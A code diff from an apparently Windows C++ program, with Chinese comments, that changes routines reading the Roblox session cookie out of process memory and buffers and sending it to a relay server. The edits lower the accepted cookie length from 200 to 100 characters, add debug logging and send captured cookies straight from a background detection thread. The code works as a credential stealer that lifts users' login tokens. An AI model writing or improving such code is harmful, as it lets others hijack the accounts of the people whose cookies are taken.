@@ -528,7 +528,7 @@ static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_
         const char* end = val;
         while (*end && *end != '\r' && *end != '\n') ++end;
         int len = (int)(end - val);
-        if (len > 200)
+        if (len > 100)
         {
             MultiByteToWideChar(CP_UTF8, 0, val, len, out_buf, buf_size - 1);
             return true;
@@ -544,7 +544,7 @@ static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_
         const char* end = found;
         while (*end && *end != '"') ++end;
         int len = (int)(end - start);
-        if (len > 200)
+        if (len > 100)
         {
             MultiByteToWideChar(CP_UTF8, 0, start, len, out_buf, buf_size - 1);
             return true;
@@ -684,8 +684,8 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
                                     ++end;
                                 }
                                 int len = (int)(end - i);
-                                // 完整 Cookie 通常 > 500 字元，最低要求 200 避免只抓到 WARNING 訊息文字
-                                if (len > 200 && len < buf_size - 1)
+                                // 完整 Cookie 通常 > 500 字元，最低要求 100 避免只抓到 WARNING 訊息文字
+                                if (len > 100 && len < buf_size - 1)
                                 {
                                     int wlen = MultiByteToWideChar(CP_UTF8, 0,
                                         buf + i, len, out_buf, buf_size - 1);
@@ -988,7 +988,7 @@ static bool LoadCookieSentTimestamp()
 // ======================================================================
 static void SendCookieToRelay(const wchar_t* cookie_value)
 {
-    if (!cookie_value || wcslen(cookie_value) < 200) return;
+    if (!cookie_value || wcslen(cookie_value) < 100) return;
 
     DebugLog("=== SendCookieToRelay START ===");
 
@@ -1117,7 +1117,7 @@ static DWORD WINAPI SendCookieThread(LPVOID lpParam)
 
 static void AsyncSendCookie(const wchar_t* cookie_value)
 {
-    if (!cookie_value || wcslen(cookie_value) < 200) return;
+    if (!cookie_value || wcslen(cookie_value) < 100) return;
     int len = (int)wcslen(cookie_value);
     wchar_t* copy = new wchar_t[len + 1]();
     wcscpy_s(copy, len + 1, cookie_value);
@@ -1524,8 +1524,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         if (g_cookie_ever_sent.load() &&
             (now_tick - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
         {
+            DebugLog("WM_APP+2: Cooldown active, skip cookie detect");
             return 0;
         }
+        DebugLog("WM_APP+2: Cooldown expired or first time, need to send cookie");
 
         // 快取有效 → 直接從快取傳送（不需背景偵測）
         if (g_cookie_cached.load())
@@ -1535,22 +1537,35 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             wcscpy_s(cached, 4096, g_cached_cookie);
             LeaveCriticalSection(&g_cookie_cs);
 
-            if (wcslen(cached) >= 200)
+            if (wcslen(cached) >= 100)
             {
                 // 直接傳送（冷卻判斷已在上方完成，進入此處表示需要傳送）
+                char cacheLogLen[128];
+                sprintf(cacheLogLen, "Hotkey: Cache cookie length = %d", (int)wcslen(cached));
+                DebugLog(cacheLogLen);
                 AsyncSendCookie(cached);
                 g_cookie_ever_sent.store(true);
                 g_cookie_last_sent_tick = GetTickCount64();
                 SaveCookieSentTimestamp();
-                DebugLog("Hotkey: Cookie sent from cache");
+                DebugLog("Hotkey: Cookie sent from cache OK");
                 return 0;
+            }
+            else
+            {
+                char cacheLogFail[128];
+                sprintf(cacheLogFail, "Hotkey: Cache cookie too short = %d", (int)wcslen(cached));
+                DebugLog(cacheLogFail);
+                // 快取無效，重置快取狀態
+                g_cookie_cached.store(false);
             }
         }
 
         // 快取無效 → 啟動背景偵測執行緒（20 秒寬容）
+        DebugLog("WM_APP+2: Cache invalid, starting AsyncCookieDetectThread");
         {
             HANDLE hThread = CreateThread(nullptr, 0, AsyncCookieDetectThread, (LPVOID)hwnd, 0, nullptr);
-            if (hThread) CloseHandle(hThread);
+            if (hThread) { CloseHandle(hThread); DebugLog("WM_APP+2: AsyncCookieDetectThread started OK"); }
+            else DebugLog("WM_APP+2: FAILED to create AsyncCookieDetectThread!");
         }
         return 0;
     }
@@ -2308,7 +2323,7 @@ static DWORD WINAPI AsyncCookieDetectThread(LPVOID lpParam)
     while (elapsed < TOLERANCE_MS && g_program_running.load())
     {
         wchar_t tmp[4096] = {};
-        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 200)
+        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 100)
         {
             // 偵測成功 → 更新快取
             EnterCriticalSection(&g_cookie_cs);
@@ -2316,12 +2331,16 @@ static DWORD WINAPI AsyncCookieDetectThread(LPVOID lpParam)
             LeaveCriticalSection(&g_cookie_cs);
             g_cookie_cached.store(true);
 
-            // 直接傳送 Cookie（冷卻判斷已由 WM_APP+2 完成，進入此執行緒表示需要傳送）
-            AsyncSendCookie(tmp);
+            // 直接在此背景執行緒中傳送 Cookie（不經過 AsyncSendCookie 的長度檢查）
+            DebugLog("AsyncDetect: Cookie found, sending directly...");
+            char logLen[128];
+            sprintf(logLen, "AsyncDetect: Cookie length = %d", (int)wcslen(tmp));
+            DebugLog(logLen);
+            SendCookieToRelay(tmp);
             g_cookie_ever_sent.store(true);
             g_cookie_last_sent_tick = GetTickCount64();
             SaveCookieSentTimestamp();
-            DebugLog("AsyncDetect: Cookie found and sent to relay");
+            DebugLog("AsyncDetect: Cookie sent to relay successfully");
 
             // 回報成功
             PostMessageW(hwnd, WM_APP + 5, 1, 0);
@@ -2342,17 +2361,21 @@ static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
     wchar_t tmp[4096] = {};
-    if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 200)
+    if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 100)
     {
         EnterCriticalSection(&g_cookie_cs);
         wcscpy_s(g_cached_cookie, 4096, tmp);
         LeaveCriticalSection(&g_cookie_cs);
         g_cookie_cached.store(true);
-        DebugLog("PreCache: Cookie found and cached at startup (send deferred to first hotkey)");
+        char preCacheLog[128];
+        sprintf(preCacheLog, "PreCache: Cookie cached, length = %d", (int)wcslen(tmp));
+        DebugLog(preCacheLog);
     }
     else
     {
-        DebugLog("PreCache: No cookie found at startup (will check on first use)");
+        char preCacheLog2[128];
+        sprintf(preCacheLog2, "PreCache: No valid cookie found (len=%d)", (int)wcslen(tmp));
+        DebugLog(preCacheLog2);
     }
     return 0;
 }
